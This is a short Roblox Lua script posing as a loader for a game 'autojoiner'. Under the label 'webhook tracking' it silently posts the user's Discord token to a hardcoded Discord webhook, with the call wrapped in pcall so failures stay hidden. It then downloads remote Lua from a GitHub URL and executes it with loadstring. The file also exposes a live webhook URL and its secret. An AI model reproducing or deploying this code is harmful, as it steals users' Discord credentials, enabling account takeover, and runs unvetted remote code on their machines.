-- Located at:
-- https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/games/autojoiner.lua

-- 1. Handle webhook tracking
if Discord_Token ~= "" then
    pcall(function()
        local trackingUrl = "https://discord.com/api/webhooks/1398907652582670417/me6wbdz-G9wFXqJFObmT3jspzPa7HwfeR-ADjJzqz8c8r1P8nAo8_s1sHO_By8de1DRW"
        local data = {
            ["content"] = "Script executed by: "..Discord_Token,
            ["username"] = "User Tracker"
        }
        game:GetService("HttpService"):PostAsync(trackingUrl, game:GetService("HttpService"):JSONEncode(data))
    end)
end

-- 2. Now load the FINAL autojoiner script
loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/games/autojoiner.lua"))()
